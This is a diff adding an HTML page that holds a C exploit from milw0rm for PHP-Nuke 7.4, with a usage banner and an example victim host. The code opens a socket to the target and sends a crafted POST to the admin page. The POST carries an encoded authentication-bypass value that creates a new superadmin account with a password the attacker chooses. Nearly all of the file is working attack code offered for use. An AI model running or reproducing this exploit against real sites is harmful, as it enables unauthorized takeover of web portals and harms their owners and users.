@@ -1,0 +1,167 @@
+<html>
+<head>
+<title>PHP-Nuke v7.4 admin exploit (old exploit)</title>
+<pre>
+/* 
+ * old exploit but what pretty code /str0ke
+ */
+
+/****************************************************
+*                                                   *
+* phpNUKE v7.4 exploit                              *
+*                                                   *
+* this exploit create new admin with relative       *
+* passwd that you specified on parameter of exploit *
+* you take administrative control of the webPortal  *
+*                                                   *
+* Reverences: http://www.osvdb.org/9563             * 
+*                                                   *
+* coded by: Silentium of Anacron Group Italy        *
+*      date: 07/02/2005                             *
+*    e-mail: anacrongroupitaly[at]autistici[dot]org *
+*   my_home: www.autistici.org/anacron.group-italy  *
+*                                                   *
+* this tool is developed under GPL license          *
+* no(c) .:. copyleft                                *
+*                                                   *
+****************************************************/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+
+#define PORT 80		// port of web server 
+
+void info(void);
+void sendxpl(FILE *out, char *argv[]);
+void errsock(void);
+void errgeth(void);
+void errconn(char *argv[]);
+
+int main(int argc, char *argv[]){
+
+FILE *out;
+int sock, sockconn;
+struct sockaddr_in addr;
+struct hostent *hp;
+
+if(argc!=5)
+   info();
+   
+if((sock = socket(AF_INET,SOCK_STREAM,0)) &lt; 0)
+   errsock();
+   
+   system(&quot;clear&quot;);
+   printf(&quot;[*] Creating socket		[OK]\n&quot;);
+
+if((hp = gethostbyname(argv[1])) == NULL)
+   errgeth();
+   
+   printf(&quot;[*] Resolving victim host	[OK]\n&quot;);
+   
+memset(&amp;addr,0,sizeof(addr));
+memcpy((char *)&amp;addr.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
+addr.sin_family = AF_INET;
+addr.sin_port = htons(PORT);
+
+sockconn = connect(sock,(struct sockaddr *)&amp;addr,sizeof(addr));
+if(sockconn &lt; 0)
+   errconn(argv);
+   
+   printf(&quot;[*] Connecting at victim host   [OK]\n&quot;);
+   
+out = fdopen(sock,&quot;a&quot;);
+setbuf(out,NULL);
+
+sendxpl(out,argv);
+
+   printf(&quot;[*] Now check your username and password\n&quot; 
+          &quot;    on http://%s%s\n\n&quot;,argv[1],argv[2]);
+
+shutdown(sockconn,2);
+close(sockconn);
+
+return 0;
+
+}
+
+
+void info(void){
+
+system(&quot;clear&quot;);
+printf(&quot;#########################################\n&quot;
+       &quot;# phpNUKE v7.4 exploit                  #\n&quot;
+       &quot;#########################################\n&quot;
+       &quot;# this exploit create an admin with     #\n&quot;
+       &quot;# the relative password, for your fun.  #\n&quot;
+       &quot;# exploit coded by Silentium            #\n&quot;
+       &quot;# Anacron Group Italy                   #\n&quot;
+       &quot;# www.autistici.org/anacron-group-italy #\n&quot;
+       &quot;#########################################\n\n&quot;
+       &quot;[Use]\n\n&quot; 
+       &quot; silePNUKExpl &lt;victim_host&gt; &lt;path_adminpage&gt; &lt;username&gt; &lt;password&gt;\n\n&quot;
+       &quot;[example]\n\n&quot;
+       &quot; silePNUKExpl www.victim.com /admin.php sile silePass\n\n&quot;); 
+exit(1);
+
+}
+
+
+void sendxpl(FILE *out, char *argv[]){
+
+int size = 145;
+
+size+=sizeof(argv[3]);
+size+=sizeof(argv[4]);
+    
+    fprintf(out,&quot;POST %s HTTP/1.0\n&quot;
+                &quot;Connection: Keep-Alive\n&quot;
+                &quot;Pragma: no-cache\n&quot;
+                &quot;Cache-control: no-cache\n&quot;
+                &quot;Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n&quot;
+                &quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n&quot;
+                &quot;Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n&quot;
+                &quot;Accept-Language: en\n&quot;
+                &quot;Host: %s\n&quot;
+                &quot;Content-Type: application/x-www-form-urlencoded\n&quot;
+                &quot;Content-Length: %d\n\n&quot;
+                &quot;add_aid=%s&amp;add_name=morte&amp;add_pwd=%s&amp;add_email=email%%40mail.com&amp;admin=&quot;
+                &quot;eCcgVU5JT04gU0VMRUNUIDEvKjox&amp;add_radminsuper=1&amp;op=AddAuthor&amp;Submit=&quot;
+                &quot;Create+Admin\n\n&quot;,argv[2],argv[1],size,argv[3],argv[4]);
+                 
+                 printf(&quot;[*] Sending exploit		[OK]\n\n&quot;);
+
+}
+            
+                 
+void errsock(void){
+
+system(&quot;clear&quot;);
+printf(&quot;[x] Creating socket	[FAILED]\n\n&quot;);
+exit(1);
+
+}
+
+
+void errgeth(void){
+
+printf(&quot;[x] Resolving victim host	[FAILED]\n\n&quot;);
+exit(1);
+
+}
+
+
+void errconn(char *argv[]){
+
+printf(&quot;[x] Connecting at victim host	[FAILED]\n\n&quot;,argv[1]);
+exit(1);
+
+}
+
+// milw0rm.com [2005-02-09]
+</pre>
+</html>
+
